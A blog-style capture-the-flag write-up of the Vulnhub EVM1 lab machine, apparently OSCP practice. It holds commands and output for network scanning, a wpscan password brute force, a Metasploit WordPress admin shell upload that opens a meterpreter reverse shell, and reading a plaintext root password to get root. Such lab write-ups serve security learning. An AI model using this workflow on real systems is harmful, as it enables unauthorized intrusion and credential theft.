---
title: Write-up EVM on Vulnhub
author: eMVee
date: 2022-09-06 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP]
render_with_liquid: false
---

Today I've downloaded [EVM1 from vulnhub](https://www.vulnhub.com/entry/evm-1,391/) because it was on the [TJnull OSCP list machines](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) and it was also on my to do list. Because the vulnerable machine is from Vulnhub the operating system is probably a Linux distro. After downloading I've imported into my virtual environment and changed it to my virtual network. As soon as the machine was ready, I booted my Kali VM and the vulnerable machine.

## Getting started

As usual I check my own IP address and write it into my notes.
~~~bash
┌──(emvee㉿kali)-[~]
└─$ ip a            
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:c7:ee:60 brd ff:ff:ff:ff:ff:ff
    inet 192.168.138.4/24 brd 192.168.138.255 scope global dynamic noprefixroute eth0
       valid_lft 325sec preferred_lft 325sec
    inet6 fe80::a00:27ff:fec7:ee60/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
~~~
There are several ways to run a ping sweep in a network. Within the environment of HTB, I never run those commands because I know the IP address of the target. But in my own environment it is possible to run a ping sweep without bothering anyone else. So I started with the old school '''netdiscover -r 192.168.138.0/24''' range.
~~~bash                
┌──(emvee㉿kali)-[~]
└─$ sudo netdiscover -r 192.168.138.0/24 

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                               
                                                                                                                                                                                             
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.138.1   52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                            
 192.168.138.2   52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                            
 192.168.138.3   08:00:27:0a:1a:c9      1      60  PCS Systemtechnik GmbH                                                                                                                    
 192.168.138.17  08:00:27:61:81:4f      1      60  PCS Systemtechnik GmbH                                                                                                                    

~~~
A new IP address was shown in the list. This IP address is probably my target so I will save it to my notes. Another option to run a network sweep is with fping. The command withing the CLI should look like this: '''fping 192.168.138.0/24 -ag 2>/dev/null '''

~~~bash
┌──(emvee㉿kali)-[~]
└─$ fping 192.168.138.0/24 -ag 2>/dev/null                                      
192.168.138.1
192.168.138.2
192.168.138.3
192.168.138.4
192.168.138.17
~~~
As expected the IP address: 192.168.138.17 is shown again. Another possibility to run a network sweep is with nmap.
This is a option which I not use that often, so I try to keep it to my methods so I will remember this as an option if others are not working for me.
~~~bash
┌──(emvee㉿kali)-[~]
└─$ nmap -sn -n -T4 192.168.138.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 07:48 CEST
Nmap scan report for 192.168.138.1
Host is up (0.00056s latency).
Nmap scan report for 192.168.138.4
Host is up (0.00049s latency).
Nmap scan report for 192.168.138.17
Host is up (0.00068s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.07 seconds
~~~
Again the IP address: 192.168.138.17 is shown in the results. So after confirming this IP address via three different commands it is time to move on and start scanning. I create a variable with the IP address within it and perform a ping request to see if the host is answering my ping request.

~~~bash
┌──(emvee㉿kali)-[~]
└─$ ip=192.168.138.17

┌──(emvee㉿kali)-[~]
└─$ ping -c3 $ip            
PING 192.168.138.17 (192.168.138.17) 56(84) bytes of data.
64 bytes from 192.168.138.17: icmp_seq=1 ttl=64 time=0.477 ms
64 bytes from 192.168.138.17: icmp_seq=2 ttl=64 time=0.996 ms
64 bytes from 192.168.138.17: icmp_seq=3 ttl=64 time=0.925 ms

--- 192.168.138.17 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2035ms
rtt min/avg/max/mdev = 0.477/0.799/0.996/0.229 ms
~~~
The machine is replying to my ping request and I notice that the time to live value (TTL) is 64. This tells me for the moment that this machine is probably running a kind of Linux distro.
Since the machine is replying as expected I started my portascan to identify open ports, services and versions.
~~~bash
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 07:54 CEST
Nmap scan report for 192.168.138.17
Host is up (0.00088s latency).
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES UIDL CAPA PIPELINING AUTH-RESP-CODE SASL TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: listed ID OK LITERAL+ more have post-login SASL-IR LOGINDISABLEDA0001 capabilities Pre-login ENABLE IDLE IMAP4rev1 LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:61:81:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-06T05:54:46
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2022-09-06T01:54:45-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.88 ms 192.168.138.17

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.52 seconds
~~~
A lot of infortion is shown in the nmap results. The following items are added to my notes
* Ubuntu
* Port 22
    * OpenSSH 7.2p2
* Port 53
    * BIND 9.10.3-P4
* Port 80
    * Apache httpd 2.4.18
    * Default Apache page
* *Port 110
    * POP3 service?
* Port 139, 445
    * SMB
    * FQDN: ubuntu-extermely-vulnerable-m4ch1ine
* Port 143
    * IMAP service?

Nmap has found several interesting things, so I decided that I was starting to enumerate at the SMB service. First I would like to know which file shares are shared.
~~~bash
┌──(emvee㉿kali)-[~]
└─$ smbclient -L $ip                   
Password for [WORKGROUP\emvee]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (ubuntu-extermely-vulnerable-m4ch1ine server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP  
        
~~~
Smbclient shows two file shares but without any insight if I have permissions to those file shares. To get some more information about those fileshares I decided to run smbmap.

~~~bash
┌──(emvee㉿kali)-[~]
└─$ smbmap -H $ip       
[+] Guest session       IP: 192.168.138.17:445  Name: 192.168.138.17                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (ubuntu-extermely-vulnerable-m4ch1ine server (Samba, Ubuntu))

~~~
Within seconds the results were shown in my CLI. This attack path didn't look that promising anymore, so it was time to reconsider going after the HTTP service.
I started Nikto to gather some information and identify some vulnerabilities.

~~~bash
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://$ip     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.138.17
+ Target Hostname:    192.168.138.17
+ Target Port:        80
+ Start Time:         2022-09-06 08:09:56 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2a45, size: 5964d0a414860, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 7915 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-09-06 08:10:59 (GMT2) (63 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~
Some interesting findings were identified by Nikto which I kept in my mind to probably check later after enumerating the webservice.
Whatweb is one of my favourite tools, so after nikto I ran whatweb.

~~~bash
┌──(emvee㉿kali)-[~]
└─$ whatweb http://$ip
http://192.168.138.17 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.138.17], Title[Apache2 Ubuntu Default Page: It works]
~~~
This time whatweb did not find any juicy information, but it still confirmed all my earlier gathered information. 
While there are still many options for gathering information, I thought it was time to visit the website and see what else could be found.


![Image](/assets/img/WriteUp/Vulnhub/EVM/1.png){: width="700" height="400" }

The default page is shown to any user who is visiting this webpage. But if you look closely to the page and read carefully a hint is given about a WordPress website.
Perhaps dirsearch could find some other hidden directories. So I started dirsearch and I used the medium wordlist to enumerate directories.

~~~bash
┌──(emvee㉿kali)-[~]
└─$ dirsearch -u http://$ip -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/192.168.138.17/_22-09-06_09-01-33.txt

Error Log: /home/emvee/.dirsearch/logs/errors-22-09-06_09-01-33.log

Target: http://192.168.138.17/

[09:01:33] Starting: 
[09:01:34] 301 -  320B  - /wordpress  ->  http://192.168.138.17/wordpress/ 
<---- Still running ---->
~~~
After the second time seeing the wordpress directory I decided to start wpscan to enumerate for some users.
~~~bash
┌──(emvee㉿kali)-[~]
└─$ wpscan --url http://$ip/wordpress -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.138.17/wordpress/ [192.168.138.17]
[+] Started: Tue Sep  6 09:10:03 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.138.17/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.138.17/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.138.17/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.138.17/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.138.17/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.138.17/wordpress/, Match: 'WordPress 5.2.4'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:10 <===============================================================================================================================================================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:10

[i] User(s) Identified:

[+] c0rrupt3d_brain
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Sep  6 09:11:14 2022
[+] Requests Done: 48
[+] Cached Requests: 4
[+] Data Sent: 12.054 KB
[+] Data Received: 89.275 KB
[+] Memory used: 142.973 MB
[+] Elapsed time: 00:01:11
~~~

As soon wpscan has finished the first scan I noticed a few interesting items.
* Username: c0rrupt3d_brain
* Upload directory has listing enabled
* WordPress version 5.2.4

Perhaps is is possible to bruteforce the password of this user which was found earlier with wpscan. I decided to use the famous rockyou wordlist for the password.
~~~bash                     
┌──(emvee㉿kali)-[~]
└─$ wpscan --url http://$ip/wordpress --usernames 'c0rrupt3d_brain' --passwords /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.138.17/wordpress/ [192.168.138.17]
[+] Started: Tue Sep  6 21:30:38 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.138.17/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.138.17/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.138.17/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.138.17/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.138.17/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.138.17/wordpress/, Match: 'WordPress 5.2.4'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0rrupt3d_brain / 24992499                                                                                                                                                        
Trying c0rrupt3d_brain / 24992499 Time: 00:03:43 <                                                                                                  > (10700 / 14355092)  0.07%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0rrupt3d_brain, Password: 24992499

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Sep  6 21:35:02 2022
[+] Requests Done: 10866
[+] Cached Requests: 4
[+] Data Sent: 3.85 MB
[+] Data Received: 48.364 MB
[+] Memory used: 210.242 MB
[+] Elapsed time: 00:04:24
~~~

So I've found a valid username:password combination '''c0rrupt3d_brain:24992499''', which can be used to logon to WordPress.

![Image](/assets/img/WriteUp/Vulnhub/EVM/2.png){: width="700" height="400" }

By visiting the WordPress site, I noticed that the IP address connecting to is not in my virtual network.
So let's see how it can be bypassed, using other methods to exploit the WordPress website... Exploiting this website manually would take a lot of time because it doesn't load that fast.
Perhaps Metasploit could be used. To start Metasploit without the great banner I use the flag **-q**. As soon Metasploit is loaded, I search for the admin shell for WordPress.


~~~bash
┌──(emvee㉿kali)-[~]
└─$ msfconsole -q


msf6 > search wordpress admin shell

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_admin_shell_upload
~~~
There is just one module available, so there is nothing else to choose.
~~~bash
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
~~~
After explicit telling to use the exploit module, I would like to know some details about it.
~~~bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show info

       Name: WordPress Admin Shell Upload
     Module: exploit/unix/webapp/wp_admin_shell_upload
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-02-21

Provided by:
  rastating

Available targets:
  Id  Name
  --  ----
  0   WordPress

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD                    yes       The WordPress password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
                                        tasploit
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the wordpress application
  USERNAME                    yes       The WordPress username to authenticate with
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module will generate a plugin, pack the payload into it and 
  upload it to a server running WordPress provided valid admin 
  credentials are used.

msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
~~~
The options are all known to me, so I can just add the details to the exploit module and run the exploit to gain a shell.
~~~bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.138.17
RHOSTS => 192.168.138.17
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME c0rrupt3d_brain
USERNAME => c0rrupt3d_brain
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD 24992499
PASSWORD => 24992499
~~~
When I think I entered all the data which is needed, I double check all the details by the command **show options**.
~~~bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   24992499         yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.138.17   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M
                                         etasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wordpress        yes       The base path to the wordpress application
   USERNAME   c0rrupt3d_brain  yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.138.4    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > 

~~~
Everything is setup correctly. So, it is showtime! By entering the command **run** and hitting the enter key on my keyboard the exploit should work.
~~~bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 192.168.138.4:4444 
[*] Authenticating with WordPress using c0rrupt3d_brain:24992499...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/dBytIRehrF/NMCpJuVTcm.php...
[*] Sending stage (39927 bytes) to 192.168.138.17
[+] Deleted NMCpJuVTcm.php
[+] Deleted dBytIRehrF.php
[+] Deleted ../dBytIRehrF
[*] Meterpreter session 1 opened (192.168.138.4:4444 -> 192.168.138.17:37230) at 2022-09-06 21:48:08 +0200

meterpreter >
~~~
And it worked, I got a meterpreter session. Now it is time to get a shell by just typing **shell** in the CLI and hitting the enter key.
~~~bash
meterpreter > shell
Process 1951 created.
Channel 0 created.
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory
whoami;id;pwd
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~
Since it is an simple shell without any details which I prefer, I decided to upgrade the shell a bit with Python.
~~~bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@ubuntu-extermely-vulnerable-m4ch1ine:$ 

~~~
After upgrading the shell, it was time to enumerate the directories and files within the */home* directory.

~~~bash
www-data@ubuntu-extermely-vulnerable-m4ch1ine:$ ls /home -ahlR
ls /home -ahlR
/home:
total 12K
drwxr-xr-x  3 root     root     4.0K Oct 30  2019 .
drwxr-xr-x 23 root     root     4.0K Oct 30  2019 ..
drwxr-xr-x  3 www-data www-data 4.0K Nov  1  2019 root3r

/home/root3r:
total 40K
drwxr-xr-x 3 www-data www-data 4.0K Nov  1  2019 .
drwxr-xr-x 3 root     root     4.0K Oct 30  2019 ..
-rw-r--r-- 1 www-data www-data  515 Oct 30  2019 .bash_history
-rw-r--r-- 1 www-data www-data  220 Oct 30  2019 .bash_logout
-rw-r--r-- 1 www-data www-data 3.7K Oct 30  2019 .bashrc
drwxr-xr-x 2 www-data www-data 4.0K Oct 30  2019 .cache
-rw-r--r-- 1 www-data www-data   22 Oct 30  2019 .mysql_history
-rw-r--r-- 1 www-data www-data  655 Oct 30  2019 .profile
-rw-r--r-- 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt
-rw-r--r-- 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root     root        4 Nov  1  2019 test.txt

/home/root3r/.cache:
total 8.0K
drwxr-xr-x 2 www-data www-data 4.0K Oct 30  2019 .
drwxr-xr-x 3 www-data www-data 4.0K Nov  1  2019 ..
-rw-r--r-- 1 www-data www-data    0 Oct 30  2019 motd.legal-displayed
www-data@ubuntu-extermely-vulnerable-m4ch1ine:$ 
~~~
I allways love to execute the **ls -ahlR /home** command, it shows me all direcotries and files, even if they are hidden.
By scrolling thru the results I noticed the following file "**.root_password_ssh.txt**". This sounds very promising to capture a password for the root account.So I decided to tun the **cat** command to see if the file contains a plain text password.


~~~bash
www-data@ubuntu-extermely-vulnerable-m4ch1ine:$ cat /home/root3r/.root_password_ssh.txt
<ulnerable-m4ch1ine:$ cat /home/root3r/.root_password_ssh.txt                
willy26
~~~

Sincy this hidden files has a plain text password in its wfile I have to write it to my notes: root:willy26
Within the shell I could try to use the **su** command to switch user to root with the password found in the previous step.
~~~bash
www-data@ubuntu-extermely-vulnerable-m4ch1ine:$ su root
su root
Password: willy26

shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
root@ubuntu-extermely-vulnerable-m4ch1ine:# whoami;id;hostname;pwd
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
ubuntu-extermely-vulnerable-m4ch1ine\
root@ubuntu-extermely-vulnerable-m4ch1ine:# 
~~~
Since I am root on the system I only have to capture the flag. The flag should be in the root directory.
~~~bash
root@ubuntu-extermely-vulnerable-m4ch1ine:# ls /root
ls /root
proof.txt
root@ubuntu-extermely-vulnerable-m4ch1ine:# cat /root/proof.txt
cat /root/proof.txt
voila you have successfully pwned me :) !!!
:D
~~~

While closing some windows, I noticed that finally the WordPress website loaded. If the website loaded faster, I would have tried to exploit is manually.
![Image](/assets/img/WriteUp/Vulnhub/EVM/3.png){: width="700" height="400" }